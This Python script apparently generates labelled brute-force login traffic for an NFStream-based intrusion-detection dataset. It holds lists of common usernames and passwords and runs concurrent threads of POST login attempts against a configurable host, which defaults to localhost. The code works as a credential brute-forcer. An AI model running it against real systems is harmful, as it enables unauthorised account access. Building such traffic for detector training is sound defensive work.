#!/home/mayank/Desktop/DATACOLLECTION/venv/bin/python
"""
gen_brute_force.py — BRUTE_FORCE (class 4) traffic generator
=============================================================
High-throughput concurrent version using threading.

NFStream flow-level distinguishers vs BENIGN:
  - Extremely high flow rate to a SINGLE port (8080/login)
  - Very regular inter-arrival times (automated, no jitter)
  - Consistent payload size per flow (fixed login form JSON)
  - Short per-flow duration (POST + 401 response = fast round trip)
  - All flows to same dst_ip:dst_port (concentrated targeting)

Usage:
    python3 attacks/gen_brute_force.py [--host 127.0.0.1] [--port 8080]
                                        [--duration 120] [--workers 50]
"""
import argparse
import json
import random
import time
import threading
import urllib.request
import urllib.error
import itertools
from datetime import datetime

# ── Credential lists ───────────────────────────────────────────────────────────
USERNAMES = [
    "admin", "root", "administrator", "user", "test",
    "guest", "superuser", "sysadmin", "manager", "operator",
    "service", "backup", "deploy", "devops", "monitor",
    "oracle", "postgres", "mysql", "ftp", "smtp",
    "webmaster", "info", "mail", "support", "helpdesk",
]
PASSWORDS = [
    "password", "123456", "admin", "letmein", "welcome",
    "monkey", "dragon", "master", "sunshine", "princess",
    "login", "passw0rd", "qwerty", "abc123", "iloveyou",
    "admin123", "root123", "test123", "changeme", "default",
    "1234567890", "password123", "111111", "000000", "654321",
    "Password1!", "P@ssw0rd", "Admin@123", "Secure123!", "Winter2024!",
    "Summer2023!", "Spring2024", "January@1", "qwerty123", "pass1234",
]

_lock   = threading.Lock()
_count  = 0
_done   = 0

def _inc():
    global _count
    with _lock:
        _count += 1
        return _count


def attempt_login(host, port, username, password):
    """Single login attempt — one new TCP connection = one NFStream flow."""
    url     = f"http://{host}:{port}/login"
    payload = json.dumps({"username": username, "password": password}).encode()
    req     = urllib.request.Request(
        url, data=payload,
        headers={
            "Content-Type": "application/json",
            "Content-Length": str(len(payload)),
        },
        method="POST",
    )
    try:
        with urllib.request.urlopen(req, timeout=3) as resp:
            return resp.status
    except urllib.error.HTTPError as e:
        return e.code
    except Exception:
        return 0


def brute_worker(host, port, stop_event, mode):
    """
    Worker thread: fires login attempts in a tight loop until stop_event is set.
    Each attempt = new TCP connection = new NFStream flow.
    """
    if mode == "sequential":
        combos = itertools.cycle(itertools.product(USERNAMES, PASSWORDS))
    elif mode == "targeted":
        combos = itertools.cycle(
            [("admin", p) for p in PASSWORDS] +
            [("root",  p) for p in PASSWORDS] +
            [("administrator", p) for p in PASSWORDS]
        )
    else:  # random
        def _rand():
            while True:
                yield random.choice(USERNAMES), random.choice(PASSWORDS)
        combos = _rand()

    for user, passwd in combos:
        if stop_event.is_set():
            break
        attempt_login(host, port, user, passwd)
        n = _inc()
        if n % 2000 == 0:
            print(f"  [BF] {n:,} attempts fired...", flush=True)


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--host",     default="127.0.0.1")
    parser.add_argument("--port",     type=int, default=8081)
    parser.add_argument("--duration", type=int, default=120,
                        help="Seconds to run (default 120)")
    parser.add_argument("--workers",  type=int, default=50,
                        help="Concurrent brute-force threads (default 50)")
    parser.add_argument("--mode",
                        choices=["sequential", "random", "targeted"],
                        default="random")
    args = parser.parse_args()

    print("=" * 60)
    print("  BRUTE_FORCE Traffic Generator (concurrent)")
    print(f"  Target  : {args.host}:{args.port}/login")
    print(f"  Duration: {args.duration}s")
    print(f"  Workers : {args.workers} concurrent threads")
    print(f"  Mode    : {args.mode}")
    print(f"  Expected: ~{args.workers * args.duration * 2}+ flows")
    print("=" * 60)

    stop_event = threading.Event()
    threads    = []

    for _ in range(args.workers):
        t = threading.Thread(
            target=brute_worker,
            args=(args.host, args.port, stop_event, args.mode),
            daemon=True,
        )
        t.start()
        threads.append(t)

    start = datetime.now()
    time.sleep(args.duration)
    stop_event.set()

    for t in threads:
        t.join(timeout=5)

    elapsed = (datetime.now() - start).total_seconds()
    print()
    print(f"[BF] Done: {_count:,} attempts in {elapsed:.1f}s  "
          f"({_count / max(elapsed, 1):.0f} req/s)")
    print(f"[BF] Each attempt = 1 TCP flow → ~{_count:,} NFStream flows")


if __name__ == "__main__":
    main()
